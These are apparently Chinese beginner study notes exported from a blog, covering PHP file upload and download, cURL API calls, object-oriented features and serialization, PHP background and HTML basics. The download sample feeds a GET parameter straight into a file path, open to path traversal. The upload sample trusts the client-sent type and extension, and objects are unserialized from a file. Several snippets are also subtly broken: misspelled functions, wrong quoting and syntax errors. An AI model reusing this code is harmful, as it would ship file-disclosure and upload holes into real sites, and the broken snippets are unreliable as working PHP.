            echo <meta http-equiv="refresh"content="3;url='.$_SERVER['HTTP_REFERER'].'">;
        }
        
        #5.设计新的文件名（唯一）(格式：20190423xxxx.jpg)
        $suffix=strrchr($_FILES[$key]['name'],'.');		#4.1获取扩展名
        $filename=date('Ymd').uniqid().$suffix;	#产生唯一ID
        
        #6.设置存储目录	upload/年/月/日/
        $dir='upload/'.date('/Y/m/d/');
        if(!file_exists($dir)){
            mkdir($dir,0777,true);
        }
        #7.移动临时文件到存储目录
        if(move_upload_file($tmp,$dir.$filename)){
            echo '上传成功';
        }else{
            echo '上传失败';
        }
	}


```

​	上传文件完全版：

```
	/**
	 * upload 单文件上传
	 * @param  string $saveDir   存储目录
	 * @param  array  $allowType 允许类型
	 * @return string 错误信息            
	 * @return array  新的文件名            
	 */
	function upload($saveDir='uploads/',$allowType=['image'])
	{
		#1.检测文件是否符合服务器大小限制（$_FILES是否为空）
        $key=key($_FILES);			
        if(is_null($key)){			#若超过8M，错误号2，post协议不通过，FILES数组为空
            return '文件太大，上传失败';			#返回信息
        }
        
        #2.获取错误号，输出错误信息
        $error=$_FILES[$key]['error'];		#获取当前错误号
        if($error!=0){				#若错误号不为0，即上传失败，输出原因
            switch($error){
                case 1:return '文件太大，上传失败';break;
                case 2:return '文件太大，上传失败';break;
                case 3:return '网络中断';break;
                case 4:return '未上传文件';break;
                case 6:return '服务器繁忙（服务器存储目录丢失）';break;
                case 7:return '服务器繁忙（权限不足）';break;
            }
        }
        
        #3.检测是否是post上传过来的
        $tmp=$_FILES[$key]['tmp_name'];		#获取缓存目录
        if(!is_uploaded_file($tmp)){		#是否通过post发送
            return '非法上传';
        }
        
        #4.检测文件类型是否符合要求
        $type=strtok($_FILES[$key]['type'],'/');	#获取文件类型
        if(!in_array($type,$allowType)){
            return '上传类型不符合要求'；
        }
        
        #5.设计新的文件名（唯一）(格式：20190423xxxx.jpg)
        $suffix=strrchr($_FILES[$key]['name'],'.');		#4.1获取扩展名
        $filename=date('Ymd').uniqid().$suffix;	#产生唯一ID
        
        #6.设置存储目录	upload/年/月/日/
        $dir=$saveDir.date('/Y/m/d/');
        if(!file_exists($dir)){
            mkdir($dir,0777,true);
        }
        #7.移动临时文件到存储目录
        if(move_uploaded_file($tmp,$dir.$filename)){
            return [$filename];
        }else{
            return '上传失败';
        }
	}
	
	$result=upload();
	if(is_array($result)){
        notice('上传成功','http://www.baidu.con');
	}else{
        notice($result);
	}
	
	/**
	 * notice 提示信息
	 * @param  string  $info 提示信息
	 * @param  string  $url  提示之后的跳转地址
	 * @param  integer $time 几秒后进行跳转
	 */
	function notice($info,$url=null,$time=3)
	{
        echo $info;
        if($is_null($url)){
            $url=$_SERVER['HTTP_REFERER'];
        }
        echo "<meta http-equiv='refresh' content='{$time}; url={$url}'>";
        die;
	}

```

### 10.文件下载

#### 1.步骤

​	1.接收下载的文件名

```
	$name = $_GET['name'];
	$suffix=strchr($name,'');

```

​	2.凑完整的路径

```
	$path = './download/'.$name;

```

​	3.准备下载之后的名字

```
	$filename=str_shuffle(md5($name)).$suffix;
	header("content-disposition:attachment;filename={$filename}");

```

​	4.读取文件内容	

```
	readfile($path);

```



]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>文件操作</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP接口开发常用API</title>
    <url>/2018/10/25/PHP%E6%8E%A5%E5%8F%A3%E5%BC%80%E5%8F%91%E5%B8%B8%E7%94%A8API/</url>
    <content><![CDATA[


## 1 接口 API


接口一 返回 json  新闻接口

    API地址    天行数据
    http://api.tianapi.com/keji/?key=你的APIKEY&num=20
        请求参数:
        必须参数:
            apikey: 必须有API密钥(url参数)
            num:  返回文章数量 默认10(url参数)
        可选参数:
            rand: 是否随机获取 默认0为不随机
            word: 关键字
            page: 分页 默认1

接口二 返回 xml 最新影讯信息

    API 地址    聚合数据文档:
    https://www.juhe.cn/docs/api/id/94

## 2 curl

curl_init()
curl_setopt()
curl_exec()
curl_close()

## 3.1 json处理

json_decode
json_encode

## 3.2 xml处理

 parseXML (XML解析器)
 XMLReader
 DOM
 SimpleXML

## 4 框架处理接口

https://blockchain.info/api/exchange_rates_api

## 5 范例

```
eg1 -- json 数据处理:
    // CURL
    $curl = curl_init();
    // var_dump($curl);

    $apikey = '请使用你自己的APIKEY';

    // url 编码数据
    $word = urlencode('大米');
    // var_dump($word);exit;

    $url = 'http://api.tianapi.com/keji/?key='.$apikey.'&num=20&word='.$word;

    // URL 设置
    curl_setopt($curl, CURLOPT_URL, $url);
    // 将curl_exec()获取的信息以字符串返回，而不是直接输出。
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);

    // CURL 执行
    $data = curl_exec($curl);

    curl_close($curl);

    // 判断 处理结果 $data...
    // var_dump($data);

    // 处理 JSON 数据
    $jsonObj = json_decode($data);
    // var_dump($jsonObj);
    // 提取文章信息
    $newslist = $jsonObj->newslist;
    // var_dump($newslist);
```



```
eg2 -- xml数据处理:

$movieName = empty($_GET['m'])?'':$_GET['m'];
$movie = urldecode($movieName);
$key = '请使用自己的APIKEY';
$url = 'http://op.juhe.cn/onebox/movie/video?key='.$key.'&dtype=xml&q='.$movie;

// CURL
$curl = curl_init();

// URL 设置
curl_setopt($curl, CURLOPT_URL, $url);
// 将curl_exec()获取的信息以字符串返回，而不是直接输出。
curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);

// CURL 执行
$data = curl_exec($curl);
$obj = simplexml_load_string($data);

echo '<pre>';
    // print_r($data);
    // print_r($obj);
    // var_dump($obj);
echo '</pre>';

curl_close($curl);
```



------------------------
## API平台

阿里云云市场: https://market.aliyun.com/
天行数据: https://www.tianapi.com/
聚合数据: https://www.juhe.cn/
易源数据: https://www.showapi.com/
百度API Store平台: http://apistore.baidu.com/
七牛云: https://www.qiniu.com
阿里大于(通信): https://dayu.aliyun.com/
容联云通讯: http://www.yuntongxun.com/

地图SDK:
高德地图开放平台: http://lbs.amap.com/
百度地图开放平台: http://lbsyun.baidu.com/

BAT:
微信开放平台: https://open.weixin.qq.com/
腾讯开放平台: http://open.qq.com/
百度开发者中心: https://developer.baidu.com/
淘宝开放平台: http://open.taobao.com/
阿里云开发者平台: https://dev.aliyun.com/search.html

支付接口:
支付宝开放平台(蚂蚁金服): https://open.alipay.com
微信支付: https://pay.weixin.qq.com/wiki/doc/api/index.html

登录/应用类:
QQ互联: https://connect.qq.com
新浪微博开放平台: http://open.weibo.com/
优酷开放平台: https://open.youku.com/
饿了么开放平台: http://openapi.eleme.io/
百度AI开放平台: https://ai.baidu.com/
讯飞开放平台: http://www.xfyun.cn/
百度翻译开放平台: http://api.fanyi.baidu.com/

工具:
百度富文本编辑器(UEditor):
http://ueditor.baidu.com/website/
ECharts 百度Javascript的图表库:
http://echarts.baidu.com/
蚂蚁金服数据可视化:
https://antv.alipay.com/zh-cn/index.html
BizCharts 数据可视化:
https://github.com/alibaba/BizCharts

---------------------------------------
PS.

精美图标 支持搜索
http://www.easyicon.net/

极验验证
http://www.geetest.com/

Amaze UI
http://amazeui.org/

MUI
http://dev.dcloud.net.cn/mui/

zui性感的框架
http://www.zui.sexy

Layui
http://www.layui.com/doc/
http://layer.layui.com/
]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>接口</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-OOP面向对象</title>
    <url>/2018/05/13/PHP-OOP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[
## 2.面向对象

### 1.类简介

> 主要内容包括 类 和 对象

1.类

​	class类中主要两种元素，函数（方法），变量（属性）

​	函数不调用不执行功能，类不实例化为对象无法使用

2. 设计类的时候，需要考虑什么：（一切皆对象）

   该类有什么（属性）？

   该类会什么（方法）？

3. 注意：

   - 类本身是无法执行的，本身是虚构的，不存在的
   - 对象才是真正能使用的

4. 类与对象之间的关系

   - 类 就是对象的抽象化
   - 对象 就是类的实例化

5. 格式

```
	class 类名
	{
        成员属性
        成员方法
	}

```

6.实例

```
	class Beauty
	{
		public $name = '迪丽热巴';		#属性
		public $age = 18;
		public $weight = '90斤';
		public $height = '180cm';

		public function skill1()		#方法
		{
			echo '吹';
		}
		public function skill2()
		{
			echo '拉';
		}
		public function skill3()
		{	
			echo '弹';
		}
		public function skill4()
		{	
			echo '唱';
		}
	}

	$obj = new Beauty;		#实例化

	echo $obj->name;		#对象 -> 属性名
	echo $obj->height;
	echo $obj->weight;
	
	$obj->skill1();		#对象 -> 方法名()
	$obj->skill2();
	$obj->skill3();

```

总结：

​	1、在使用之前，要先将类实例化为对象，即：`类->对象` 

​	 `$对象名 = new 类名;` 	

​	2、输出属性时，格式为：`对象 -> 属性名` 

​	 `echo $obj->name;`

​	3、调用方法时，格式为：`对象 -> 方法名()` 

​	 `$obj->skill();` 

### 2.伪对象

1.定义

​	在类的内部，可以使用自己的属性or方法，此时， `$this` 代表当前对象

称为伪对象

2.实例

```
class Beauty
	{
		public $name = '迪丽热巴';
		public $age = 18;
		public $weight = '90斤';
		public $height = '180cm';
		public function skill1(){echo '吹';}
		public function skill2(){echo '拉';}
		public function skill3(){echo '弹';}
		public function skill4(){echo '唱';}
		public function demo(){
// 类的内部, 使用自己的属性or方法
				$x = new Beauty;
				echo $x->name;
				$x->skill4();
				echo '<hr>';

				echo $this->name;
				$this->skill4();
				echo '<hr>';
				}
		}
	}

```

总结：

​	伪对象`$this `代表当前对象, 在哪个类中使用, 就相当于` $this = new 当前类名 ` 

​	 `$this `不需要实例化, 可直接使用. 

​	 `$this `只能在类内使用

### 3.连贯操作

​	若要在执行时连续调用方法，可采用如下格式：

​	1. `$obj->step1()->step2()->step3()...;`

​	2.将连续调用的前面的方法加上`return $this` 

注意：若直接采用1，而不return返回对象，会报错 `Call to a member function step2() on null` 相当于`null->step2()`

### 4.魔术方法

#### 1.定义：

​	魔术方法，就是在指定条件触发时，会自动调用的方法，这里主要介绍两种

​	`__construct()` 构造方法

​	`__destruct()` 析构方法

#### 2.构造方法

​	触发条件：在实例化时，自动触发

​	使用场合：常用于初始化属性

​	注意：一般构造都写在方法的最前面，属性的最后面

```
	class Lengend
	{
		#构造方法
		public function __construct()
		{
			echo '<h1>欢迎来到召唤师峡谷</h1>';
		}
		#普通方法
		public function demo()
		{
			echo '升段局，掉2挂1，人马加大树强撑40分钟，队友重连绝地翻盘<hr>';
		}
	}

	$obj=new Lengend;
	$obj->__construct();
	// $obj->demo();

```

#### 3.析构方法

​	触发条件：当对象被销毁时，自动触发，包括：

​		1）.程序全部执行完，自然销毁

​		2）.对象被主动删除了

​		3）.对象被覆盖了（更换）

​	使用场合：当对象使用完的一些扫尾操作（fclose、closedir）

​	注意：一般析构方法都写在方法的最后面

```
	class Lengend
	{
		public function demo()
		{
			echo '开始一盘游戏';
			echo '<hr>';
		}
		public function __destruct()
		{
			echo '关上电脑';
		}
	}
	$obj=new Lengend;
	$obj->demo();
	echo '断电了<br>';
	
	unset($obj);		#2)对象被主动删除

	$obj='迪丽热巴';		 #3)换对象了
							#1)自然结束，就会销毁$obj,从而触发析构

```



#### 4.实例化PDO类

​	PDO 数据抽象层，专门负责数据库操作管理

```
	$dsn='mysql:host=localhost;dbname='test';charset=utf8;
	$user='root';
	$pwd='';
	$pdo=new PDO($dsn,$user,$pwd);	#1.链接数据库
	$sql='select id,nickname,tel,address from user';  #2.编写sql语句
	$pdostatement=$pdo->query($sql);	#3.执行sql语句
	$result=$pdostatement->fetchAll(PDO::FETCH_NUM);	#4.解析对象
	var_dump($result);	#5.输出结果

```

总结：

​	1.`PDO类::方法` 

- PDO::query( )		执行一条SQL语句

  成功返回PSOStatement，适合查询，失败返回false

- PDO::exec( )                   执行一条SQL语句

  成功返回受影响的行数，适合增删改，失败返回false

- PDO::lastInsertId( )       获取最近一次插入的ID

  成功返回最新的id，失败返回 `'0'` 字符

- PDO::errorInfo( )           获取错误信息



​	2.`PDOStatement类::方法 `

- PDOStatement::fetch( )	  获取结果集中的一条数据（依靠指针）失败返回false
- PDOStatement::fetchAll( )     获取结果集中的所有数据，参数设置显示格式
  - PDO::FETCH_NUM	索引数组格式
  - PDO::FETCH_ASSOC     关联数组格式
  - PDO::FETCH_BOTH       混合数组格式

## 3.OOP面向对象

面向对象OOP的三大特性：1.封装性 ；2.继承性 ；3.多态性

### 1.封装性

- 定义：将对象的所有成员结合在一起，形成一个不可分割的独立单位

- 目的：尽可能的隐藏属性 和 方法，只留下部分接口与外部联系

- 提供以下三种修饰符，来控制与外部的联系

  |  修饰符   | 本类 | 继承类 | 类外 |          |
  | :-------: | :--: | :----: | :--: | :------: |
  |  public   |  √   |   √    |  √   |  公有的  |
  | protected |  √   |   √    |  x   | 受保护的 |
  |  private  |  √   |   x    |  x   |  私有的  |

  > 想要有高安全性 或者 只想自己使用的，最好设置为private。

### 2.魔术方法

> 如果在类外使用私有属性或方法，程序会立即终止并报错
>
> 为了避免终止程序，可以使用一些魔术方法做提示，并绕过error错误

- `__get($x)`

  当访问权限不足或不存在的属性时，自动触发，返回访问属性名

- `__set($x,$y)` 

  当设置权限不足或不存在的属性时，自动触发，返回设置属性名和值

- `__unset($x)` 

  当删除权限不足或不存在的属性时，自动触发，返回要删除的属性名

- `__isset($x)` 

  当判断是否存在的目标权限不足或不存在时触发，返回要判断的属性名

- `__call($x,$y)` 

  当访问权限不足或不存在的方法时，自动触发，返回方法名和实参

- `__tostring()` 

  当echo对象时触发，返回字符串值

### 3.继承性

1. 定义：**子类**（-派生类/扩展类）继承**父类**（基础类/基类）的一些属性和方法

2. 格式

   `class 子类 extends 父类 {}` 

3. 实例

   ```
   	class laozi
   	{
   		public $name = '老王';
   		public function skill()
   		{
   			echo  '喜欢去隔壁转转 <br>';
   		}
   	}
   	class son extends laozi
   	{
   	}
   	$obj = new son;		#实例化子类
   	echo $obj->name;	#直接调用子类继承的属性
   	$obj->skill();		#直接调用子类继承的方法
   
   
   ```

4. 特点

- 子类可以继承属性，方法（除了private）

- 子类可以重写属性，方法

- 子类可以扩展方法 `parent::父级方法名` 

- 访问级别：

  `private>protected>public` 

  子类继承父类时，修饰符可以保留等级，可以降级，就是不能升级

5. 继承方式
   1. 单继承（一个子级可以继承一个父级）
   2. 连续继承（爷->父->子->孙   依次继承）
   3. 多继承（无法在PHP中实现）





### 4.类静态

1.关键字：

​	 **static**   

2.格式：

​	`static 修饰符 $属性名=属性值；` 

​	`static 修饰符  function  方法名（）{};` 

3.使用格式：

​	`类名::静态属性名` / `类名::静态方法名()` 

​	self 代表当前的类名，只能在类内使用

​	$this 代表当前的对象

```
	class Beauty
	{
		static public $name = '小张';		#设置静态属性
		// public $age = 18;		#静态类内不能使用非静态属性
		static public function demo()	#设置静态方法
		{
			echo 'i am static demo <hr>';
			echo self::$name;	#类内调用静态属性
			echo '<hr>';
		}
	}
	Beauty::demo();		#引用静态方法

```



4.特性：

- 静态属性或方法 不需要实例化就可以直接使用
- 静态方法内部只能使用静态属性或方法
- 静态属性和方法可以继承

5.魔术方法

​	 `__callStatic($x,$y)` 

​	在访问不存在的静态方法时，自动触发，返回静态方法名和实参

### 5.类常量

1.格式

​	`const  类常量名=值；` 

2.使用类常量

​	`类名::类常量` 

3.特性

- 类常量可以继承，且可以重写一次
- 普通常量可以直接在类内使用（常量没有作用域）
- 类常量不能直接在类外使用，必须要通过类名来使用

```
	const NAME = '黑寡妇';
	class Beauty
	{
		const SEX = '美女';	#定义类常量
		public function demo()
		{
			echo self::SEX;
			echo NAME; 	# 直接输出类外的 普通常量NAME
		}
	}
	echo Beauty::SEX;	#输出类内常量

```

### 6.最终 final

#### 1.使用：

```
final class Beauty		#final 修饰类，保护不被继承
	{
		public $name = '陈琳琳';
	}
	------------------------------------------------------
class Father
	{
		final public function Order()	#final修饰方法
		{
			echo '这是祖辈留下的祖训: 不能吃猪肉 <br>';
		}
	}

```

#### 2.特性

- final 可以修饰类和方法，不能修饰属性
- final 修饰类，保护类不被继承
- final 修饰方法，保护方法不被继承方法重写

### 7.克隆对象 clone

#### 1.格式

​	 `副本对象 = clone 样本对象；` 

#### 2.使用

```
class Beauty
	{
		public $name = '米拉乔沃维奇';
	}

	$a = new Beauty;	#创建一个对象
	$b = clone $a;		#克隆对象

```

#### 3.特性

​	副本与样本对象完全一样，却互不影响，完全独立

> 克隆（clone）与复制出来的对象不一样，修改克隆副本对原样本没有任何影响，而修改复制对象则会影响原样本，相同点是删除副本对原样本都没有影响，原因如下：
>
> ​	变量与内存是通过标识来引用的；
>
> ​	删除原样本，只是删除元样本和标识之间 的联系，与复制副本无关；
>
> ​	息息相关的只是内存的内容

#### 4.克隆魔术方法 

##### 1.函数：

​	`__clone()` 

##### 2.作用：

​	克隆操作时触发，可以为克隆副本重新初始化属性

##### 3.实例

```
	class Demo
	{
		public $name='kamora';
		public function __clone()
		{
			$this->name='kamora2';	#克隆对象重写
		} 
	}

	$a=new Demo;
	$b=clone $a;	#克隆操作

	var_dump($a,$b);

```

### 8.串行化/序列化

#### 1.函数

​	串行化： `serialize( )` 

​	反串行化： `unserialize( ) ` 

#### 2.目的

​	将对象串行化为字符串

#### 3.使用场景

​	传参，存入文本，存数据库 ...

#### 4.实例

```
	$obj=new Game;			#创建一个对象
	$str= serialize($obj);		#串行化对象，存入变量
	file_put_contents('./save.txt',$str);	#将变量内容存入文件
	
	$newStr=file_get_contents('./save.txt');  #读取文件内容	
	$newObj=unserialize($newStr);	#对读取内容反串行化
	$newObj->skill();	#使用对象属性方法

```

#### 5.串行化魔术方法

##### 1.函数：

- `__sleep( )` 		

​	serialize串行化时触发,用以返回需要的信息(数组形式)

- `__wakeup( )`  	     

  unserialize反串行化时触发, 用以重新初始化属性

##### 2.应用:

```
  	class Game
  	{
  		public $name = 'DNF';
  		public $money = 200000;
  		public function skill()
  		{
  			echo '崩山斩';
  		}
  		public function __sleep()
  		{
  			// 返回需要显示的信息(以数组形式返回)
  			return ['name','nickname'];
  		}	//其余信息隐藏,实际上还是存在
  
  		public function __wakeup()
  		{
  			// 在唤醒时, 重新初始化属性
  			$this->money = 2;
  		}
  	}

```

### 9.魔术方法---自动加载

> 在真实项目中 , 一个PHP文件内 , 只有一个类 , 没有多余的代码，可以在多PHP相互加载的状态下的纯PHP界面省略定界符`<?= ?>` 中的后面部分，需要引入的HTML文件使用 `include / include ` 加载	

#### 1.格式

```
	function __autoload($x)
	{
        
	}

```

#### 2.作用 : 

​		在实例化一个不存在的类时 ,  自动触发 ,  返回要求实例化的类名

#### 3.使用场景 : 

​		使用数据库功能  ,  上传文件功能  ,  图形验证码功能等....

#### 4.实例:

```
	一次性加载所有的类文件:
	function __autoload()
	{							#如果相关类文件存在
        if( file_exists("./Model/{$x}.php") ){
            include "./Model/{$x}.php";
        }else{
            header('location:404.php');	#跳转到404页面
            die;
        }
	}
	$a=new DB;	#实例化数据库类
	$b=new Upload;	#实例化上传类


```





### 10.抽象

#### 1.抽象

> 抽象方法 : 没有方法体( 代码块 ) 的方法
>
> 抽象类 : 包含抽象方法的类

1.关键字

​	`abstract` 

2.特性

- 包含抽象方法的类必须为抽象类
- 抽象类不一定需要包含抽象方法
- 抽象类不能被实例化
- 抽象类必须被子类继承 , 并实现抽象方法

3.目的

​	强制约束子类继承并实现抽象方法

```
    abstract class Demo			#定义抽象类
	{
            public function func1()
            {
                echo '该项目已经完成了 20% <br>';
            }
            abstract public function func2(); 	#定义抽象方法
 	}
     class Friend extends Demo		#子类继承抽象类
     {
            public function func2()		#子类事项抽象方法
            {
                echo '该项目已经完成了 30% <br>';
            }
      }
	$obj = new Friend;		#实例化子类,调用方法

```

#### 2.接口

1.定义

​	当类中全部都是抽象方法时,可定义为接口	

​	即接口就是抽象类( 条件 : 内部方法全部为抽象方法 ) 

2.特性

​	接口继承是通过 `implements` 关键字继承的 (不是extends)

​	接口可以实现多继承( 可以有多个父类,分别实现各个父类继承的抽象方法 )

```
    interface Demo	#定义接口Demo
    {
        public function func1();	#内部方法全部为抽象方法
        public function func2();
        public function func3();
    }	
    class Friend implements Demo  #子类继承Demo
	{
		public function func1()		#子类实现继承的抽象方法
		{
			echo '该项目已经完成了 20% <br>';
		}

		public function func2()
		{
			echo '该项目已经完成了 50% <br>';
		}

		public function func3()
		{
			echo '该项目已经完成了 30% <br>';
		}
	}
	$obj = new Friend;	#实例化子类
	$obj->func1();		#调用Demo方法

```

#### 3.类型约束

> PHP支持的函数实参类型约束有**数组**和**对象** 

格式 : 方法名( 类名 变量 )|方法名( array 变量 )

```
function demo(array $x)	#约束送入的实参只能是数组类型
	{
		var_dump($x);
	}
	
	// demo($a=100);	#送入整型数据程序报错
	$b = [10,20,30];	
	demo($b);			#送入数组,正常输出

```

```
	class Demo1 {}

	class Demo2
	{
		public function Test(Demo1 $x)  #要求送入Demo1对象
		{
			var_dump($x);
		}
	}
	
	class Demo3 {}

	$demo1 = new Demo1;		#实例化类,得到对象
	$demo2 = new Demo2;
	$demo3 = new Demo3;

	$demo2->Test($var=100);		#送入整型数据,程序报错
	$demo1->Test($demo1);	#送入demo1,正常输出

```

#### 4.接口多态性

> 多态性 : 通过同一个接口 [ 抽象类|普通类 ] ,传入不同的设备,从而实现不同的效果
>
> ( 普通类没有强制约束子类执行指定方法的特征 , 不推荐使用 )

```
	interface USB		#定义接口
	{
        public function run();
	}					#指定抽象方法,一旦实现USB必须执行run方法
	class Mouse implements USB		#继承抽象类
	{
        public function run()		#实现抽象方法
        {
            echo '安装鼠标驱动';
        }
        public function double()	#扩展接入接口的子类方法
        {
            echo '双击功能实现';
        }
	}
	class Keyboard implements USB
	{
        public function run()
        {
            echo '安装键盘驱动';
        }
        public function click()
        {
            echo '击键功能实现';
        }
	}
	class Computer		#设置接口使用环境
	{
        public function Start(USB $x)	#接入接口
        {
            $x->run();
        }
	}
	
	$c=new Computer;		#实例化
	$m=new Mouse;
	$k=new Keyboard;
	
	$c->start($m);		#依接入类型运行接口方法
	$c->start($k);	#?如何使用double()

```

#### 5.foreach遍历对象

> foreach不但能够遍历数组,也可以遍历对象

```
	class Book
	{
        public $name;	#成员属性只能定义,不赋初值
        public $price;
        private $author;
        public function __construct($a,$b,$c)	#初始化属性
        {
            $this->name = $a;
            $this->price= $b;
            $this->author=$c;
        }
        $zhang=new Book('《新三国》','30元','小飞');
        $cheng=new Book('《旧三国》','50元','阿亮');
	}									#类外依旧受修饰符影响
	foreach($zhang as $key => $value){	
        echo $key.'------'.$value.'<br>';
	}
	foreach($cheng as $key => $value){
        echo $key.'------'.$value.'<br>';
	}
```

注意: 遍历对象是将对象中的  ( 属性名=>属性值 )  遍历显示

#### 6.对象相关函数

- 判断类是否存在

  `class_exists( '类名' )`	返回bool值

- 判断某个类下的属性是否存在

  `property_exists( '类名','属性名' )` 	返回bool值

  > 可以检测私有属性,但不显示具体值

- 获取类中的所有公有属性

  `get_class_vars( '类名' )`	返回数组, 包含属性名和属性值

- 获取对象中的所有公有属性

  `get_object_vars( '对象' )`	返回数组, 包含属性名和属性值

- 获取类中的所有公有方法

  `get_class_method( '类名' )`	返回索引数组, 包含所有方法名

- 获取某个对象的类名

  `get_class( '对象' )`	返回字符串, 类名

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 简介-背景特性</title>
    <url>/2017/11/14/PHP%E7%AE%80%E8%BF%B0-%E8%83%8C%E6%99%AF%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[
## 1. PHP应用领域

> 在浏览器端应用的软件, PHP都可以进行开发

- 门户网站: 新浪, 雅虎, 搜狐
- 电子商务: 淘宝, 京东
- 网页游戏的后台
- APP接口
- 企业级项目:
  - OA: 办公自动化系统   (学生, 员工档案, 考勤...)
  - CRM: 客户关系管理系统   (销售, 中介, ...)
  - ERP: 企业物资管理系统 ( 快递, 猎头, .. )



## 2. PHP市场行情

拉勾网

Boss直聘

含金量较高:  100Offer 		门槛: 2年以上的工作经验





## 3. 软件架构模式

### 	B/S

**brower/server**  浏览器/服务器

- 无需下载, 通过浏览器来使用
- 依赖HTTP协议
- 数据存储服务器上, 安全性高
- 维护更新, 相对方便, 不占用用户时间





### 	C/S

**client/server**  客户端/服务端

- 先下载安装, 通过特定的客户端来使用
- 通过多种协议进行通信
- 数据有的存储在本地, 有的存储在服务器上, 相比B/S安全性低
- 维护更新, 相对麻烦, 比较占用用户时间



## 4.动静态网站

### 静态网站

在线浏览网页, 但是不能输入数据, 没有数据的更新和交互

### 动态网站

有数据交互过程, 链接数据库



## 5. 浏览器

### 内核浏览器

**Trident**:  IE 	独流

**Webkit**:  chrome, safari 

**Gecko**: firefox

**Blink**: chrome



### 壳浏览器

360

QQ

搜狗

猎豹

UC

百度

## 6. 开发工具IDE

- Sublime Text 3   最轻量级的IDE
- PHPStrom   最专业, 最热门的IDE之一
- ATom
- Zend Studio
- VIM 
- NodePad++



## 7. LAMP 环境

LAMP : Linux + Apache + MySQL + PHP 

LNMP: Linux + Nginx + MySQL + PHP



操作系统: Linux

服务器: Apache, Nginx

数据库: MySQL

脚本工具: PHP

## 8.使用PHP的特性

**PHP特性**：

1.PHP文件或者文件夹命名中不能有中文，不能有中文路径。

2.PHP文件存放位置：`wamp/www/`目录下。

3.访问PHP脚本的步骤：

​	开启wamp服务——>在浏览器地址栏中输入：`localhost`

4.**PHP是什么**：（`Professional Hypertext Preprocessor`）超文本预处理器

**一句话**：**一种用来开发动态网站的服务器脚本语言**。

5.**PHP定界符**

​	格式：`<?php       PHP代码         ?>`

​	只有在定界符内的代码才会被PHP解析

6.向浏览器输出一句话：`echo 'hello,world!';`

7.**PHP设置编码**（一般情况下，该编码声明写在文件头部）

​	`header('content-type:text/html;charset="utf-8"');`

8.**注释**

单行注释：`#注释内容`	or	`//注释内容`

多行注释：`/*注释内容*/`

9.**PHP基本语法**

- 每一条命令均以分号（；）结尾，代表这条命令已经结束。
- 只有最后一条可以不加，但推荐都加上。

10.查询PHP相关信息

​	`phpinfo();`

11.若只想输出一句话，可以使用如下格式：

​	`<?='hello,world!'?>`

​	`<?php echo 'hello,world!'?>`]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML (基本01)</title>
    <url>/2017/09/21/html%20-01/</url>
    <content><![CDATA[
# 一.HTML (基本01)

## 准备工作

> 1.常见的几种文件类型：
>
> *.html	*.css	*.js	*.php	*.sql
>
> 2.wamp存放位置：~/wamp/www/
>
> 3.运行：打开wamp
>
> ​		打开浏览器
>
> ​		地址栏输入localhost

### 1.HTML简介

```基本语法
<!DOCTYPE html>   <!--声明-->
<html lang="en">   <!--语言-->
<head>
	<meta charset="UTF-8">  <!--编码-->
	<title>标题</title>
</head>
<body>
	正文内容
</body>
</html>
```

​	以上为基本的一段html代码，包含**版本声明**，**编码**，**标题**，其中全局架构标签为**html**，**head**，**body**。**body**标签内部的才是文字，图片，音视频等内容需要占用的位置。

> 编码：
>
> 计算机早期, 世界只有**ASCII**编码, 只有128个, 不认识汉语, 韩语, 日语
> 新一代的编码 **Unicode**编码, 支持世界上绝大多数的语言, 数字, 字母, 标点, 汉字等都占4个字节
> 升级版 **UTF-8** 编码 (万国码), 数字,字母,标点占1B,  汉字占3B

### 2.基本语法

#### ①.全局架构标签

- html
- head
- body

#### ②.注释

注释是对代码的描述，不会显示在页面上，但可以增加代码的可读性

格式：<!--注释内容-->

**注意：不能嵌套使用**

#### ③.标签格式

网页全部是由标签组成的，标签分为两种：

- 单标签：<开始标签/>      如:`<br/>,<hr/>,<img/>,<meta/>`
- 双标签：<开始标签>正文内容<结束标签/>   如： ` <p> </p>`

#### ④.标签属性

格式：`<开始标签  属性名=“属性值”  属性名=“属性值”  ...>`

标签属性写在标签内部，每对属性之间至少保留一个空格

> **标签名和属性名不区分大小写**

### 3.浏览器特性

```浏览器特性
<!DOCTYPE html>
<html lang="cn">
<head>
    <meta charset="UTF-8">
    <title>浏览器特性</title>
</head>
<body>
    <h1>浏览器特性</h1>
    <hr>
    
	亚洲有四大邪术:
		日本的化妆术
		韩国的整容术
		泰国的变性术
		中国的PS术
</body>
</html>
```

虽然在代码中进行了排版，但实际效果是：

![无标题](D:/wamp/www/XIA/0329/%E4%BA%8C%E7%BB%84%E4%BD%9C%E4%B8%9A0329/%E5%BC%A0%E4%BB%A4%E5%B8%9B/md%E6%95%B4%E7%90%86/%E6%97%A0%E6%A0%87%E9%A2%98.jpg )

***注意***：浏览器中，任何多的空格和回车，要么**不解析**，要么解析为**一个空格**，利用这个特性，可以在代码中做好排版和注释。

> **一个职业程序员，应该有良好的注释习惯及排版审美**

### 4.文本格式标签

#### ①.标题标签

`<h1>标题</h1>`

从`<h1>`到`<h6>`,标题格式由高层级向低层级转化。一般常用的为h1到h4

其中h1标签在一个页面中最好只用**一次**，因为h1可以用于**提高搜索排名**，而使用两次及以上，则会被搜索引擎拉入**黑名单**。

### ②.段落标签

`<p>正文</p>`

在p标签中的文字，为一个段落。不同段间上下行间间距较大，自动换行

#### ③.样式标签

- `<b>bold</b>`			<b>加粗</b>
- `<i>italic</i>`                    <i>倾斜</i>
- `<u>underline</u>`              <u>下划线</u>
- `<del>delete</del>`             <del>删除线</del>

> 只负责表面样式，不具备实际意义。

#### ④.语义化标签

- `<strong> strong</strong>`        <strong>强调</strong>
- `<em>emphasize</em>`                    <em>加强</em>

> 不仅负责表面样式，还具备方便浏览器解析的特性

#### ⑤.上、下标

